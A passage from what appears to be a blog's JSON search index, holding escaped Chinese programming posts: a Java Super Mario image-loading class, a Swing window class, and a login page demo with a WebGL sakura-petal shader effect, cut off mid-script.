MC地形的生成是用到了噪声，而且不止有柏林噪声，但不是直接用噪声去生成高度的，而是生物群落决定了基础高度，而噪声只是进行平滑的作用。\n","slug":"CodeGame_Technology_Minecratf_Terrain01","date":"2021-11-06T21:11:52.000Z","categories_index":"CodeGame","tags_index":"程序","author_index":"Arvin"},{"id":"6374967d93b8cc5abec98fcd5a48952a","title":"Java 超级玛丽常量类","content":"package com.arvin;\n\nimport javax.imageio.ImageIO;\nimport java.awt.image.BufferedImage;\nimport java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\n&#x2F;**\n *  常量类 (初始化图片)\n *&#x2F;\n\npublic class StaticValue &#123;\n\n    &#x2F;**\n     *  定义所需的所有变量\n     *&#x2F;\n\n    public static BufferedImage BackgroundImage_Noe &#x3D; null; &#x2F;&#x2F; 背景 1\n    public static BufferedImage BackgroundImage_Two &#x3D; null; &#x2F;&#x2F; 背景 2\n    public static BufferedImage Jump_Left &#x3D; null;   &#x2F;&#x2F; 马里奥向左跳\n    public static BufferedImage Jump_Right &#x3D; null; &#x2F;&#x2F; 马里奥向右跳\n    public static BufferedImage Stand_Left &#x3D; null;  &#x2F;&#x2F; 马里奥向左站立\n    public static BufferedImage Stand_Right &#x3D; null; &#x2F;&#x2F; 马里奥向右站立\n    public static BufferedImage Tower &#x3D; null;   &#x2F;&#x2F; 城堡\n    public static BufferedImage Gan &#x3D; null; &#x2F;&#x2F; 旗杆\n\n    &#x2F;* 障碍物 因为障碍物很多 所以我们要创建一个列表 *&#x2F;\n    public static List&lt;BufferedImage&gt; Obstacle &#x3D; new ArrayList&lt;&gt;();\n\n    &#x2F;* 马里奥向左跑 是两张图片所以也要创建一个列表 *&#x2F;\n    public static List&lt;BufferedImage&gt; Run_Left &#x3D; new ArrayList&lt;&gt;();\n    public static List&lt;BufferedImage&gt; Run_Right &#x3D; new ArrayList&lt;&gt;(); &#x2F;&#x2F; 马里奥向右边跑\n\n    &#x2F;* 蘑菇敌人 两张行动图像一张死亡图像所以也要创建一个列表 *&#x2F;\n    public static List&lt;BufferedImage&gt; Mogu &#x3D; new ArrayList&lt;&gt;();\n\n    &#x2F;* 食人花敌人 两种图片一个张嘴图一个闭嘴图所以也要创建一个列表 *&#x2F;\n    public static List&lt;BufferedImage&gt; Flower &#x3D; new ArrayList&lt;&gt;();\n\n    &#x2F;* 路径的前缀 方便后续调用 定义一个Path 我们通过绝对路径来获取图片的路径我们除了名称外前缀都是一样的所以我们把它定义成一个变量 *&#x2F;\n    public static String Path &#x3D; System.getProperty(&quot;user.dir&quot;) + &quot;&#x2F;src&#x2F;images&#x2F;&quot;;\n\n    &#x2F;* 初始化方法 *&#x2F;\n    public static void Init()&#123;\n\n        &#x2F;&#x2F; 加载背景图片 try捕获 read 异常\n        try &#123;\n            BackgroundImage_Noe &#x3D; ImageIO.read(new File(Path + &quot;bg.png&quot;));      &#x2F;&#x2F;  背景 1\n            BackgroundImage_Two &#x3D; ImageIO.read(new File(Path + &quot;bg2.png&quot;));     &#x2F;&#x2F;  背景 2、\n            Jump_Left &#x3D; ImageIO.read(new File(Path + &quot;s_mario_jump1_L.png&quot;));   &#x2F;&#x2F;  马里奥向左跳跃\n            Jump_Right &#x3D; ImageIO.read(new File(Path + &quot;s_mario_jump1_R.png&quot;));  &#x2F;&#x2F;  马里奥向右跳跃\n            Stand_Left &#x3D; ImageIO.read(new File(Path + &quot;s_mario_stand_L.png&quot;));  &#x2F;&#x2F;  马里奥向左站立\n            Stand_Right &#x3D; ImageIO.read(new File(Path + &quot;s_mario_stand_R.png&quot;)); &#x2F;&#x2F;  马里奥向右站立\n            Tower &#x3D; ImageIO.read(new File(Path + &quot;tower.png&quot;));                 &#x2F;&#x2F;  加载城堡\n            Gan &#x3D; ImageIO.read(new File(Path +&quot;gan.png&quot;));                      &#x2F;&#x2F;  加载旗杆\n        &#125; catch (IOException exception) &#123;\n            exception.printStackTrace();\n        &#125;\n\n        &#x2F;* 加载障碍物 try捕获 read 异常 *&#x2F;\n        try &#123;\n            Obstacle.add(ImageIO.read(new File(Path + &quot;brick.png&quot;)));       &#x2F;&#x2F; 首先加载砖块一种是可破坏的一种是不可破坏的\n            Obstacle.add(ImageIO.read(new File(Path + &quot;soil_up.png&quot;)));     &#x2F;&#x2F; 加载地面(上地面) 分为两种一个是我们的上地面一个是我们的下地面\n            Obstacle.add(ImageIO.read(new File(Path + &quot;soil_base.png&quot;)));   &#x2F;&#x2F; 加载下地面\n        &#125; catch (IOException exception) &#123;\n            exception.printStackTrace();\n        &#125;\n\n        &#x2F;* 加载不可破坏的砖块和旗子 try捕获 read 异常 *&#x2F;\n        try &#123;\n            Obstacle.add(ImageIO.read(new File(Path + &quot;brick2.png&quot;)));  &#x2F;&#x2F;  不可破坏砖块\n            Obstacle.add(ImageIO.read(new File(Path + &quot;flag.png&quot;)));    &#x2F;&#x2F;  旗子障碍物\n        &#125; catch (IOException exception) &#123;\n            exception.printStackTrace();\n        &#125;\n\n        &#x2F;* 加载水管 因为是四个图像所以我们采用 For 循环处理 try捕获 read 异常 *&#x2F;\n        for (int i &#x3D; 1; i &lt;&#x3D; 4; i++) &#123;\n            try &#123;\n                Obstacle.add(ImageIO.read(new File(Path + &quot;pipe&quot; + i + &quot;.png&quot;)));\n            &#125; catch (IOException exception) &#123;\n                exception.printStackTrace();\n            &#125;\n        &#125;\n\n        &#x2F;* 加载马里奥向左跑图片 因为有两张所以我们要采用 For 循环 try捕获 read 异常 *&#x2F;\n        for (int i &#x3D; 1; i &lt;&#x3D; 2; i++) &#123;\n            try &#123;\n                Run_Left.add(ImageIO.read(new File(Path + &quot;s_mario_run&quot; + i + &quot;_L.png&quot;)));\n            &#125; catch (IOException exception) &#123;\n                exception.printStackTrace();\n            &#125;\n        &#125;\n\n        &#x2F;* 加载马里奥向右跑图片 因为有两张所以我们和加载马里奥向左跑图片一样 *&#x2F;\n        for (int i &#x3D; 1; i &lt;&#x3D; 2; i++) &#123;\n            try &#123;\n                Run_Right.add(ImageIO.read(new File(Path + &quot;s_mario_run&quot; + i + &quot;_R.png&quot;)));\n            &#125; catch (IOException exception) &#123;\n                exception.printStackTrace();\n            &#125;\n        &#125;\n\n        &#x2F;* 加载蘑菇敌人 因为是三张图片所以我们仍然通过一个 For 循环 *&#x2F;\n        for (int i &#x3D; 1; i &lt;&#x3D; 3; i++) &#123;\n            try &#123;\n                Mogu.add(ImageIO.read(new File(Path + &quot;fungus&quot; + i + &quot;.png&quot;)));\n            &#125; catch (IOException exception) &#123;\n                exception.printStackTrace();\n            &#125;\n        &#125;\n\n        &#x2F;* 加载食人花敌人 因为是两张图片所以我们仍然通过一个 For 循环 加载*&#x2F;\n        for (int i &#x3D; 1; i &lt;&#x3D; 2; i++)&#123;\n            try &#123;\n                Flower.add(ImageIO.read(new File(Path + &quot;flower1.&quot; + i + &quot;.png&quot;)));\n            &#125; catch (IOException exception) &#123;\n                exception.printStackTrace();\n            &#125;\n        &#125;\n\n    &#125;\n&#125;","slug":"CodeGame_Java_SuperMary_Test02","date":"2021-11-06T11:44:52.000Z","categories_index":"CodeGame","tags_index":"程序","author_index":"Arvin"},{"id":"da69133c682847c464fcd9e3550d815c","title":"Java 创建窗口","content":"Java 窗口绘制\n\n\n\n\n\n\n\n\n创建窗口我们需要继承 JFrame 类\n向窗口对象添加键盘监听器 需要该类实现 KeyListener 接口 并重写抽象方法\n代码演示package com.arvin;\n\nimport javax.swing.*;\nimport java.awt.event.KeyEvent;\nimport java.awt.event.KeyListener;\n\n&#x2F;**\n *  窗口框架类\n *&#x2F;\n\npublic class WindowsFrame  extends JFrame implements KeyListener &#123;\n\n    &#x2F;&#x2F; 空参构造\n    public WindowsFrame()&#123;\n\n        &#x2F;&#x2F; 设置窗口的大小为 800 * 600\n        this.setSize(800, 600);\n\n        &#x2F;&#x2F; 设置窗口居中显示\n        this.setLocationRelativeTo(null);\n\n        &#x2F;&#x2F; 设置窗口的可见性\n        this.setVisible(true);\n\n        &#x2F;&#x2F; 创建点击窗口上的关闭键，结束程序\n        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n\n        &#x2F;&#x2F; 设置窗口大小不可变\n        this.setResizable(false);\n\n        &#x2F;&#x2F; 向窗口对象添加键盘监听器 需要该类实现 KeyListener 接口 并重写抽象方法\n        this.addKeyListener(this);\n\n        &#x2F;&#x2F; 设置窗口名称\n        this.setTitle(&quot;超级玛丽&quot;);\n\n    &#125;\n\n    &#x2F;**\n     *  Main 主函数\n     *&#x2F;\n\n    public static void main(String[] args)&#123;\n\n        &#x2F;&#x2F; 创建 WindowsFrame 的对象\n        WindowsFrame windowsFrame &#x3D; new WindowsFrame();\n    &#125;\n\n    &#x2F;**\n     *  KeyListener并重写抽象方法\n     *&#x2F;\n\n    @Override\n    public void keyTyped(KeyEvent e) &#123;\n\n    &#125;\n\n    @Override\n    public void keyPressed(KeyEvent e) &#123;\n\n    &#125;\n\n    @Override\n    public void keyReleased(KeyEvent e) &#123;\n\n    &#125;\n&#125;\n\n","slug":"CodeGame_Java_SuperMary_Test01","date":"2021-11-05T10:57:52.000Z","categories_index":"CodeGame","tags_index":"程序","author_index":"Arvin"},{"id":"6fcc820b9ac2c2a3332c50f6a1ac1644","title":"Login Page 设计演示01","content":"分享大家一个好看的 Login Page 代码\n\n演示图\n演示代码&lt;!--\n    Developer: @Arvin\n    Explain: Login Page\n--&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&#x2F;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&#x2F;&gt;\n    &lt;title&gt;Login Page&lt;&#x2F;title&gt;\n    &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;\n        body&#123;\n            background-color: #A7CFFF;\n            text-align: center;\n            overflow: hidden;\n            margin: 0;\n        &#125;\n\n        H1&#123;\n            margin-top: 38px;\n        &#125;\n\n        H1,H2&#123;\n            color: #1F2029;\n            user-select: none;\n        &#125;\n\n        .switch&#123;\n            background-color: #FCFBFA;\n            width: 400px;\n            height: 170px;\n            position: absolute;\n            left: 50%;\n            margin-left: -200px;\n            top: 73%;\n            border-radius: 8px;\n        &#125;\n\n        &#x2F;* 选择同级后最近元素 @Arvin *&#x2F;\n        #change:checked+label,\n        #change:not(:checked)+label&#123;\n            background-color: #ff5f99;\n            color: #FCFBFA;\n            width: 280px;\n            position: absolute;\n            padding: 8px 0; &#x2F;* Padding 方便文字垂直居中显示 @Arvin *&#x2F;\n            left: 50%;\n            font-size: 24px;\n            font-weight: 600;\n            margin-left: -140px;\n            top: 82%;\n            border-radius: 25px;\n            cursor: pointer;\n        &#125;\n\n        &#x2F;* 页面旋转模块 *&#x2F;\n        .turn&#123;\n            width: 400px;\n            height: 450px;\n            top: 8%;\n            position: absolute;\n            perspective: 800px; &#x2F;* 旋转时候的透视效果 @Arvin *&#x2F;\n            left: 50%;\n            margin-left: -200px;\n        &#125;\n\n        .over&#123;\n            width: 100%;\n            height: 100%;\n            transition: all 1.6s ease; &#x2F;* 旋转的持续时间 ease 是慢快慢 @Arvin *&#x2F;\n            transform-style: preserve-3d;\n        &#125;\n\n        #change:checked\n        ~\n        .turn .over&#123;\n            transform: rotateY(180deg);\n        &#125;\n\n        form&#123;\n            position: absolute;\n            height: 100%;\n            border-radius: 25px;\n            background-color: #FCFBFA;\n            transform-style: preserve-3d;\n        &#125;\n\n        .sign&#123;\n            transform: rotateY(180deg);\n        &#125;\n\n        input&#123;\n            background-color: #4E495D;\n            width: 70%;\n            height: 48px;\n            border-radius: 8px;\n            padding: 0 16px;\n            margin-bottom: 20px;\n            font-size: 18px;\n            font-weight: 500;\n            color: #ff5f99;\n            outline: none;\n            border: none;\n            box-shadow: 0 4px 8px rgba(78, 73, 79, .5);\n            transform-style: preserve-3d;\n            transform: translate3d(0, 0, 1px);\n        &#125;\n\n        &#x2F;* 选择 Class 为 Login 的子元素中的前三个 input @Arvin *&#x2F;\n        .login input:nth-child(-n+3)&#123;\n            margin: 20px 0;\n        &#125;\n\n        .btn&#123;\n            background-color: #981E61;\n            border: none;\n            width: 280px;\n            font-weight: 600;\n            color: #FCFBFA;\n            font-size: 24px;\n            padding: 6px 0;\n            border-radius: 25px;\n            margin-top: 15px;\n            cursor: pointer;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n\n&lt;!-- 旋转开关 @Arvin --&gt;\n&lt;div class&#x3D;&quot;switch&quot;&gt;&lt;H2&gt;没有&#x2F;已有账户？&lt;&#x2F;H2&gt;&lt;&#x2F;div&gt;\n&lt;input type&#x3D;&quot;checkbox&quot; style&#x3D;&quot;display: none;&quot; id&#x3D;&quot;change&quot;&#x2F;&gt;\n&lt;label for&#x3D;&quot;change&quot;&gt;切 换&lt;&#x2F;label&gt;\n\n&lt;div class&#x3D;&quot;turn&quot;&gt;\n    &lt;div class&#x3D;&quot;over&quot;&gt;\n        &lt;form action&#x3D;&quot;&quot; class&#x3D;&quot;login&quot;&gt;\n            &lt;H1&gt;欢迎回来（＾－＾）&lt;&#x2F;H1&gt;\n            &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;用户名&quot;&#x2F;&gt;\n            &lt;input type&#x3D;&quot;passwirld&quot; placeholder&#x3D;&quot;密码&quot;&#x2F;&gt;\n            &lt;input type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn&quot; value&#x3D;&quot;登 录&quot;&#x2F;&gt;\n        &lt;&#x2F;form&gt;\n\n        &lt;form action&#x3D;&quot;&quot; class&#x3D;&quot;sign&quot;&gt;\n            &lt;H1&gt;加入我们（＾－＾）&lt;&#x2F;H1&gt;\n            &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;用户名&quot;&#x2F;&gt;\n            &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;邮箱&quot;&#x2F;&gt;\n            &lt;input type&#x3D;&quot;passwirld&quot; placeholder&#x3D;&quot;密码&quot;&#x2F;&gt;\n            &lt;input type&#x3D;&quot;passwirld&quot; placeholder&#x3D;&quot;确认密码&quot;&#x2F;&gt;\n            &lt;input type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn&quot; value&#x3D;&quot;注册&quot;&#x2F;&gt;\n        &lt;&#x2F;form&gt;\n    &lt;&#x2F;div&gt;\n&lt;&#x2F;div&gt;\n\n&lt;!-- 樱花效果 来源于网上开源代码 @Arvin --&gt;\n&lt;!-- partial:index.partial.html --&gt;\n&lt;canvas id&#x3D;&quot;sakura&quot;&gt;&lt;&#x2F;canvas&gt;\n\n&lt;!-- sakura shader --&gt;\n&lt;script id&#x3D;&quot;sakura_point_vsh&quot; type&#x3D;&quot;x-shader&#x2F;x_vertex&quot;&gt;\n  uniform mat4 uProjection;\n  uniform mat4 uModelview;\n  uniform vec3 uResolution;\n  uniform vec3 uOffset;\n  uniform vec3 uDOF;  &#x2F;&#x2F;x:focus distance, y:focus radius, z:max radius\n  uniform vec3 uFade; &#x2F;&#x2F;x:start distance, y:half distance, z:near fade start\n\n  attribute vec3 aPosition;\n  attribute vec3 aEuler;\n  attribute vec2 aMisc; &#x2F;&#x2F;x:size, y:fade\n\n  varying vec3 pposition;\n  varying float psize;\n  varying float palpha;\n  varying float pdist;\n\n  &#x2F;&#x2F;varying mat3 rotMat;\n  varying vec3 normX;\n  varying vec3 normY;\n  varying vec3 normZ;\n  varying vec3 normal;\n\n  varying float diffuse;\n  varying float specular;\n  varying float rstop;\n  varying float distancefade;\n\n  void main(void) &#123;\n      &#x2F;&#x2F; Projection is based on vertical angle\n      vec4 pos &#x3D; uModelview * vec4(aPosition + uOffset, 1.0);\n      gl_Position &#x3D; uProjection * pos;\n      gl_PointSize &#x3D; aMisc.x * uProjection[1][1] &#x2F; -pos.z * uResolution.y * 0.5;\n\n      pposition &#x3D; pos.xyz;\n      psize &#x3D; aMisc.x;\n      pdist &#x3D; length(pos.xyz);\n      palpha &#x3D; smoothstep(0.0, 1.0, (pdist - 0.1) &#x2F; uFade.z);\n\n      vec3 elrsn &#x3D; sin(aEuler);\n      vec3 elrcs &#x3D; cos(aEuler);\n      mat3 rotx &#x3D; mat3(\n          1.0, 0.0, 0.0,\n          0.0, elrcs.x, elrsn.x,\n          0.0, -elrsn.x, elrcs.x\n      );\n      mat3 roty &#x3D; mat3(\n          elrcs.y, 0.0, -elrsn.y,\n          0.0, 1.0, 0.0,\n          elrsn.y, 0.0, elrcs.y\n      );\n      mat3 rotz &#x3D; mat3(\n          elrcs.z, elrsn.z, 0.0,\n          -elrsn.z, elrcs.z, 0.0,\n          0.0, 0.0, 1.0\n      );\n      mat3 rotmat &#x3D; rotx * roty * rotz;\n      normal &#x3D; rotmat[2];\n\n      mat3 trrotm &#x3D; mat3(\n          rotmat[0][0], rotmat[1][0], rotmat[2][0],\n          rotmat[0][1], rotmat[1][1], rotmat[2][1],\n          rotmat[0][2], rotmat[1][2], rotmat[2][2]\n      );\n      normX &#x3D; trrotm[0];\n      normY &#x3D; trrotm[1];\n      normZ &#x3D; trrotm[2];\n\n      const vec3 lit &#x3D; vec3(0.6917144638660746, 0.6917144638660746, -0.20751433915982237);\n\n      float tmpdfs &#x3D; dot(lit, normal);\n      if(tmpdfs &lt; 0.0) &#123;\n          normal &#x3D; -normal;\n          tmpdfs &#x3D; dot(lit, normal);\n      &#125;\n      diffuse &#x3D; 0.4 + tmpdfs;\n\n      vec3 eyev &#x3D; normalize(-pos.xyz);\n      if(dot(eyev, normal) &gt; 0.0) &#123;\n          vec3 hv &#x3D; normalize(eyev + lit);\n          specular &#x3D; pow(max(dot(hv, normal), 0.0), 20.0);\n      &#125;\n      else &#123;\n          specular &#x3D; 0.0;\n      &#125;\n\n      rstop &#x3D; clamp((abs(pdist - uDOF.x) - uDOF.y) &#x2F; uDOF.z, 0.0, 1.0);\n      rstop &#x3D; pow(rstop, 0.5);\n      &#x2F;&#x2F;-0.69315 &#x3D; ln(0.5)\n      distancefade &#x3D; min(1.0, exp((uFade.x - pdist) * 0.69315 &#x2F; uFade.y));\n  &#125;\n  &lt;&#x2F;script&gt;\n&lt;script id&#x3D;&quot;sakura_point_fsh&quot; type&#x3D;&quot;x-shader&#x2F;x_fragment&quot;&gt;\n  #ifdef GL_ES\n  &#x2F;&#x2F;precision mediump float;\n  precision highp float;\n  #endif\n\n  uniform vec3 uDOF;  &#x2F;&#x2F;x:focus distance, y:focus radius, z:max radius\n  uniform vec3 uFade; &#x2F;&#x2F;x:start distance, y:half distance, z:near fade start\n\n  const vec3 fadeCol &#x3D; vec3(0.08, 0.03, 0.06);\n\n  varying vec3 pposition;\n  varying float psize;\n  varying float palpha;\n  varying float pdist;\n\n  &#x2F;&#x2F;varying mat3 rotMat;\n  varying vec3 normX;\n  varying vec3 normY;\n  varying vec3 normZ;\n  varying vec3 normal;\n\n  varying float diffuse;\n  varying float specular;\n  varying float rstop;\n  varying float distancefade;\n\n  float ellipse(vec2 p, vec2 o, vec2 r) &#123;\n      vec2 lp &#x3D; (p - o) &#x2F; r;\n      return length(lp) - 1.0;\n  &#125;\n\n  void main(void) &#123;\n      vec3 p &#x3D; vec3(gl_PointCoord - vec2(0.5, 0.5), 0.0) * 2.0;\n      vec3 d &#x3D; vec3(0.0, 0.0, -1.0);\n      float nd &#x3D; normZ.z; &#x2F;&#x2F;dot(-normZ, d);\n      if(abs(nd) &lt; 0.0001) discard;\n\n      float np &#x3D; dot(normZ, p);\n      vec3 tp &#x3D; p + d * np &#x2F; nd;\n      vec2 coord &#x3D; vec2(dot(normX, tp), dot(normY, tp));\n\n      &#x2F;&#x2F;angle &#x3D; 15 degree\n      const float flwrsn &#x3D; 0.258819045102521;\n      const float flwrcs &#x3D; 0.965925826289068;\n      mat2 flwrm &#x3D; mat2(flwrcs, -flwrsn, flwrsn, flwrcs);\n      vec2 flwrp &#x3D; vec2(abs(coord.x), coord.y) * flwrm;\n\n      float r;\n      if(flwrp.x &lt; 0.0) &#123;\n          r &#x3D; ellipse(flwrp, vec2(0.065, 0.024) * 0.5, vec2(0.36, 0.96) * 0.5);\n      &#125;\n      else &#123;\n          r &#x3D; ellipse(flwrp, vec2(0.065, 0.024) * 0.5, vec2(0.58, 0.96) * 0.5);\n      &#125;\n\n      if(r &gt; rstop) discard;\n\n      vec3 col &#x3D; mix(vec3(1.0, 0.8, 0.75), vec3(1.0, 0.9, 0.87), r);\n      float grady &#x3D; mix(0.0, 1.0, pow(coord.y * 0.5 + 0.5, 0.35));\n      col *&#x3D; vec3(1.0, grady, grady);\n      col *&#x3D; mix(0.8, 1.0, pow(abs(coord.x), 0.3));\n      col &#x3D; col * diffuse + specular;\n\n      col &#x3D; mix(fadeCol, col, distancefade);\n\n      float alpha &#x3D; (rstop &gt; 0.001)? (0.5 - r &#x2F; (rstop * 2.0)) : 1.0;\n      alpha &#x3D; smoothstep(0.0, 1.0, alpha) * palpha;\n\n      gl_FragColor &#x3D; vec4(col * 0.5, alpha);\n  &#125;\n  &lt;&#x2F;script&gt;\n&lt;!-- effects --&gt;\n&lt;script id&#x3D;&quot;fx_common_vsh&quot; type&#x3D;&quot;x-shader&#x2F;x_vertex&quot;&gt;\n  uniform vec3 uResolution;\n  attribute vec2 aPosition;\n\n  varying vec2 texCoord;\n  varying vec2 screenCoord;\n\n  void main(void) &#123;\n      gl_Position &#x3D; vec4(aPosition, 0.0, 1.0);\n      texCoord &#x3D; aPosition.xy * 0.5 + vec2(0.5, 0.5);\n      screenCoord &#x3D; aPosition.xy * vec2(uResolution.z, 1.0);\n  &#125;\n  &lt;&#x2F;script&gt;\n&lt;script id&#x3D;&quot;bg_fsh&quot; type&#x3D;&quot;x-shader&#x2F;x_fragment&quot;&gt;\n  #ifdef GL_ES\n  &#x2F;&#x2F;precision mediump float;\n  precision highp float;\n  #endif\n\n  uniform vec2 uTimes;\n\n  varying vec2 texCoord;\n  varying vec2 screenCoord;\n\n  void main(void) &#123;\n      vec3 col;\n      float c;\n      vec2 tmpv &#x3D; texCoord * vec2(0.8, 1.0) - vec2(0.95, 1.0);\n      c &#x3D; exp(-pow(length(tmpv) * 1.8, 2.0));\n      col &#x3D; mix(vec3(0.02, 0.0, 0.03), vec3(0.96, 0.98, 1.0) * 1.5, c);\n      gl_FragColor &#x3D; vec4(col * 0.5, 1.0);\n  &#125;\n  &lt;&#x2F;script&gt;\n&lt;script id&#x3D;&quot;fx_brightbuf_fsh&quot; type&#x3D;&quot;x-shader&#x2F;x_fragment&quot;&gt;\n  #ifdef GL_ES\n  &#x2F;&#x2F;precision mediump float;\n  precision highp float;\n  #endif\n  uniform sampler2D uSrc;\n  uniform vec2 uDelta;\n\n  varying vec2 texCoord;\n  varying vec2 screenCoord;\n\n  void main(void) &#123;\n      vec4 col &#x3D; texture2D(uSrc, texCoord);\n      gl_FragColor &#x3D; vec4(col.rgb * 2.0 - vec3(0.5), 1.0);\n  &#125;\n  &lt;&#x2F;script&gt;\n&lt;script id&#x3D;&quot;fx_dirblur_r4_fsh&quot; type&#x3D;&quot;x-shader&#x2F;x_fragment&quot;&gt;\n  #ifdef GL_ES\n  &#x2F;&#x2F;precision mediump float;\n  precision highp float;\n  #endif\n  uniform sampler2D uSrc;\n  uniform vec2 uDelta;\n  uniform vec4 uBlurDir; &#x2F;&#x2F;dir(x, y), stride(z, w)\n\n  varying vec2 texCoord;\n  varying vec2 screenCoord;\n\n  void main(void) &#123;\n      vec4 col &#x3D; texture2D(uSrc, texCoord);\n      col &#x3D; col + texture2D(uSrc, texCoord + uBlurDir.xy * uDelta);\n      col &#x3D; col + texture2D(uSrc, texCoord - uBlurDir.xy * uDelta);\n      col &#x3D; col + texture2D(uSrc, texCoord + (uBlurDir.xy + uBlurDir.zw) * uDelta);\n      col &#x3D; col + texture2D(uSrc, texCoord - (uBlurDir.xy + uBlurDir.zw) * uDelta);\n      gl_FragColor &#x3D; col &#x2F; 5.0;\n  &#125;\n  &lt;&#x2F;script&gt;\n&lt;!-- effect fragment shader template --&gt;\n&lt;script id&#x3D;&quot;fx_common_fsh&quot; type&#x3D;&quot;x-shader&#x2F;x_fragment&quot;&gt;\n  #ifdef GL_ES\n  &#x2F;&#x2F;precision mediump float;\n  precision highp float;\n  #endif\n  uniform sampler2D uSrc;\n  uniform vec2 uDelta;\n\n  varying vec2 texCoord;\n  varying vec2 screenCoord;\n\n  void main(void) &#123;\n      gl_FragColor &#x3D; texture2D(uSrc, texCoord);\n  &#125;\n  &lt;&#x2F;script&gt;\n&lt;!-- post processing --&gt;\n&lt;script id&#x3D;&quot;pp_final_vsh&quot; type&#x3D;&quot;x-shader&#x2F;x_vertex&quot;&gt;\n  uniform vec3 uResolution;\n  attribute vec2 aPosition;\n  varying vec2 texCoord;\n  varying vec2 screenCoord;\n  void main(void) &#123;\n      gl_Position &#x3D; vec4(aPosition, 0.0, 1.0);\n      texCoord &#x3D; aPosition.xy * 0.5 + vec2(0.5, 0.5);\n      screenCoord &#x3D; aPosition.xy * vec2(uResolution.z, 1.0);\n  &#125;\n  &lt;&#x2F;script&gt;\n&lt;script id&#x3D;&quot;pp_final_fsh&quot; type&#x3D;&quot;x-shader&#x2F;x_fragment&quot;&gt;\n  #ifdef GL_ES\n  &#x2F;&#x2F;precision mediump float;\n  precision highp float;\n  #endif\n  uniform sampler2D uSrc;\n  uniform sampler2D uBloom;\n  uniform vec2 uDelta;\n  varying vec2 texCoord;\n  varying vec2 screenCoord;\n  void main(void) &#123;\n      vec4 srccol &#x3D; texture2D(uSrc, texCoord) * 2.0;\n      vec4 bloomcol &#x3D; texture2D(uBloom, texCoord);\n      vec4 col;\n      col &#x3D; srccol + bloomcol * (vec4(1.0) + srccol);\n      col *&#x3D; smoothstep(1.0, 0.0, pow(length((texCoord - vec2(0.5)) * 2.0), 1.2) * 0.5);\n      col &#x3D; pow(col, vec4(0.45454545454545)); &#x2F;&#x2F;(1.0 &#x2F; 2.2)\n\n      gl_FragColor &#x3D; vec4(col.rgb, 1.0);\n      gl_FragColor.a &#x3D; 1.0;\n  &#125;\n  &lt;&#x2F;script&gt;\n&lt;!-- partial --&gt;\n&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;\n    &#x2F;&#x2F; Utilities\n    var Vector3 &#x3D; &#123;&#125;;\n    var Matrix44 &#x3D; &#123;&#125;;\n    Vector3.create &#x3D; function(x, y, z) &#123;\n        return &#123;&#39;x&#39;:x, &#39;y&#39;:y, &#39;z&#39;:z&#125;;\n    &#125;;\n    Vector3.dot &#x3D; function (v0, v1) &#123;\n        return v0.x * v1.x + v0.y * v1.y + v0.z * v1.z;\n    &#125;;\n    Vector3.cross &#x3D; function (v, v0, v1) &#123;\n        v.x &#x3D; v0.y * v1.z - v0.z * v1.y;\n        v.y &#x3D; v0.z * v1.x - v0.x * v1.z;\n        v.z &#x3D; v0.x * v1.y - v0.y * v1.x;\n    &#125;;\n    Vector3.normalize &#x3D; function (v) &#123;\n        var l &#x3D; v.x * v.x + v.y * v.y + v.z * v.z;\n        if(l &gt; 0.00001) &#123;\n            l &#x3D; 1.0 &#x2F; Math.sqrt(l);\n            v.x *&#x3D; l;\n            v.y *&#x3D; l;\n            v.z *&#x3D; l;\n        &#125;\n    &#125;;\n    Vector3.arrayForm &#x3D; function(v) &#123;\n        if(v.array) &#123;\n            v.array[0] &#x3D; v.x;\n            v.array[1] &#x3D; v.y;\n            v.array[2] &#x3D; v.z;\n        &#125;\n        else &#123;\n            v.array &#x3D; new Float32Array([v.x, v.y, v.z]);\n        &#125;\n        return v.array;\n    &#125;;\n    Matrix44.createIdentity &#x3D; function () &#123;\n        return new Float32Array([1.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 1.0]);\n    &#125;;\n    Matrix44.loadProjection &#x3D; function (m, aspect, vdeg, near, far) &#123;\n        var h &#x3D; near * Math.tan(vdeg * Math.PI &#x2F; 180.0 * 0.5) * 2.0;\n        var w &#x3D; h * aspect;\n\n        m[0] &#x3D; 2.0 * near &#x2F; w;\n        m[1] &#x3D; 0.0;\n        m[2] &#x3D; 0.0;\n        m[3] &#x3D; 0.0;\n\n        m[4] &#x3D; 0.0;\n        m[5] &#x3D; 2.0 * near &#x2F; h;\n        m[6] &#x3D; 0.0;\n        m[7] &#x3D; 0.0;\n\n        m[8] &#x3D; 0.0;\n        m[9] &#x3D; 0.0;\n        m[10] &#x3D; -(far + near) &#x2F; (far - near);\n        m[11] &#x3D; -1.0;\n\n        m[12] &#x3D; 0.0;\n        m[13] &#x3D; 0.0;\n        m[14] &#x3D; -2.0 * far * near &#x2F; (far - near);\n        m[15] &#x3D; 0.0;\n    &#125;;\n    Matrix44.loadLookAt &#x3D; function (m, vpos, vlook, vup) &#123;\n        var frontv &#x3D; Vector3.create(vpos.x - vlook.x, vpos.y - vlook.y, vpos.z - vlook.z);\n        Vector3.normalize(frontv);\n        var sidev &#x3D; Vector3.create(1.0, 0.0, 0.0);\n        Vector3.cross(sidev, vup, frontv);\n        Vector3.normalize(sidev);\n        var topv &#x3D; Vector3.create(1.0, 0.0, 0.0);\n        Vector3.cross(topv, frontv, sidev);\n        Vector3.normalize(topv);\n\n        m[0] &#x3D; sidev.x;\n        m[1] &#x3D; topv.x;\n        m[2] &#x3D; frontv.x;\n        m[3] &#x3D; 0.0;\n\n        m[4] &#x3D; sidev.y;\n        m[5] &#x3D; topv.y;\n        m[6] &#x3D; frontv.y;\n        